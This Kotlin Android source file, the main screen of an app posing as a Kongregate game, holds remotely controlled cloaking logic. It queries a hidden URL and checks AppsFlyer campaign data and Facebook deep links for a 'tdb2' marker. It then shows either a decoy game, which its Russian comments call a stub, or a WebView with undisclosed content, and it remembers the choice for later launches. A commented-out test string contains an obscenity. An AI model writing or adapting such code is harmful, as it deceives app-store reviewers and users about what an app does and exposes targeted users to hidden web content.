package com.kongregate.mobile.burritobi

import android.content.Context
import android.content.Intent
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.util.Log
import com.appsflyer.AppsFlyerConversionListener
import com.appsflyer.AppsFlyerLib
import com.facebook.applinks.AppLinkData
import com.kongregate.mobile.burritobi.Appja.Companion.AF_DEV_KEY
import com.kongregate.mobile.burritobi.Appja.Companion.C1
import com.kongregate.mobile.burritobi.Appja.Companion.CH
import com.kongregate.mobile.burritobi.Appja.Companion.D1
import com.kongregate.mobile.burritobi.Appja.Companion.linkAppsCheckPart1
import com.kongregate.mobile.burritobi.Appja.Companion.linkAppsCheckPart2
import com.kongregate.mobile.burritobi.databinding.ActivityMainBinding
import com.kongregate.mobile.burritobi.has.Gameja
import kotlinx.coroutines.*
import java.lang.Exception
import java.net.HttpURLConnection
import java.net.URL

class MainActivity : AppCompatActivity() {
    private lateinit var bindMain: ActivityMainBinding

    var checker: String = "null"
    lateinit var jsoup: String

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        bindMain = ActivityMainBinding.inflate(layoutInflater)
        setContentView(bindMain.root)
        jsoup = ""
        deePP(this)

        val prefs = getSharedPreferences("ActivityPREF", MODE_PRIVATE)
        if (prefs.getBoolean("activity_exec", false)) {
            //второе включение
            val sharPref = getSharedPreferences("SP", MODE_PRIVATE)
            when (sharPref.getString(CH, "null")) {
                /*
                  Логика второго открытия: пресеты 2 и 3 являются НЕактивными
                  пресет 2 скипает всю логику, кроме дипа, и открывает заглушку
                  пресет 3 скипает всю логику, кроме дипа, и открывает вебвью,
                  этот пресет нужен на случай отключения аппслфаера
                  пресеты nm, dp, org возможны только при пресете 1 в apps.txt
                  эти пресеты нужны для повторного открытия
                */
                "2" -> {
                    skipMe()
                }
                "3" -> {
                    testWV()
                }
                "nm" -> {
                    testWV()
                }
                "dp" -> {
                    testWV()
                }
                "org" -> {
                    skipMe()
                }
                else -> {
                    skipMe()
                }
            }

        } else {
            //первое включение
            val exec = prefs.edit()
            exec.putBoolean("activity_exec", true)
            exec.apply()

            val job = GlobalScope.launch(Dispatchers.IO) {
                checker = getCheckCode(linkAppsCheckPart1+linkAppsCheckPart2)
            }
            runBlocking {
                try {
                    job.join()
                } catch (_: Exception){
                }
            }

            when (checker) {
                "1" -> {
                    AppsFlyerLib.getInstance()
                        .init(AF_DEV_KEY, conversionDataListener, applicationContext)
                    AppsFlyerLib.getInstance().start(this)
                    afNullRecordedOrNotChecker(1500)
                }
                "2" -> {
                    skipMe()
                }
                "3" -> {
                    testWV()
                }

            }
        }
    }



    private suspend fun getCheckCode(link: String): String {
        val url = URL(link)
        val oneStr = "1"
        val twoStr = "2"
        val testStr = "3"
        val activeStrn = "0"
        val urlConnection = withContext(Dispatchers.IO) {
            url.openConnection()
        } as HttpURLConnection

        return try {
            when (val text = urlConnection.inputStream.bufferedReader().readText()) {
                "2" -> {
                    val sharPref = applicationContext.getSharedPreferences("SP", MODE_PRIVATE)
                    val editor = sharPref.edit()
                    editor.putString(CH, twoStr)
                    editor.apply()
                    Log.d("jsoup status", text)
                    twoStr
                }
                "1" -> {
                    Log.d("jsoup status", text)
                    oneStr
                }
                "3" -> {
                    val sharPref = applicationContext.getSharedPreferences("SP", MODE_PRIVATE)
                    val editor = sharPref.edit()
                    editor.putString(CH, testStr)
                    editor.apply()
                    Log.d("jsoup status", text)
                    testStr
                }
                else -> {
                    Log.d("jsoup status", "is null")
                    activeStrn
                }
            }
        } finally {
            urlConnection.disconnect()
        }

    }

    private fun afNullRecordedOrNotChecker(timeInterval: Long): Job {

        val sharPref = getSharedPreferences("SP", MODE_PRIVATE)
        return CoroutineScope(Dispatchers.IO).launch {
            while (NonCancellable.isActive) {
                val hawk1: String? = sharPref.getString(C1, null)
                val hawkdeep: String? = sharPref.getString(D1, "null")
                if (hawk1 != null) {
                    Log.d("TestInUIHawk", hawk1.toString())
                    if(hawk1.contains("tdb2")){
                        Log.d("zero_filter_2", "hawkname received")
                        val editor = sharPref.edit()
                        editor.putString(CH, "nm")
                        editor.apply()
                        testWV()
                    } else if (hawkdeep != null){
                        if(hawkdeep.contains("tdb2"))
                        {
                            Log.d("zero_filter_2", "hawkdeep received")
                            testWV()
                        }
                        else{
                            Log.d("zero_filter_2", "hawkdeep wrong")
                            val editor = sharPref.edit()
                            editor.putString(CH, "org")
                            editor.apply()
                            skipMe()
                        }

                    }
                    break
                } else {
                    val hawk1: String? = sharPref.getString(C1, null)
                    Log.d("TestInUIHawkNulled", hawk1.toString())
                    delay(timeInterval)
                }
            }
        }
    }



    val conversionDataListener = object : AppsFlyerConversionListener {
        override fun onConversionDataSuccess(data: MutableMap<String, Any>?) {
            val sharPref = applicationContext.getSharedPreferences("SP", MODE_PRIVATE)
            val editor = sharPref.edit()
            val dataGotten = data?.get("campaign").toString()
            editor.putString(C1, dataGotten)
            editor.apply()
        }

        override fun onConversionDataFail(p0: String?) {

        }

        override fun onAppOpenAttribution(p0: MutableMap<String, String>?) {

        }

        override fun onAttributionFailure(p0: String?) {
        }
    }


    private fun skipMe() {
        Intent(this, Gameja::class.java)
            .also { startActivity(it) }
        finish()
    }
    private fun testWV() {
        Intent(this, Webja::class.java)
            .also { startActivity(it) }
        finish()
    }
    fun deePP(context: Context) {
        val sharPref = applicationContext.getSharedPreferences("SP", MODE_PRIVATE)
        val editor = sharPref.edit()
        AppLinkData.fetchDeferredAppLinkData(
            context
        ) { appLinkData: AppLinkData? ->
            appLinkData?.let {
                val params = appLinkData.targetUri.host
                //тест
                editor.putString(D1,params.toString())
                editor.apply()
                if (params!!.contains("tdb2")){
                    editor.putString(CH, "dp")
                    editor.apply()
                }

            }
            if (appLinkData == null) {
//                //тест
//                editor.putString(D1,"tdb2vasyaidinahui")
//                editor.apply()
            }

        }
    }





}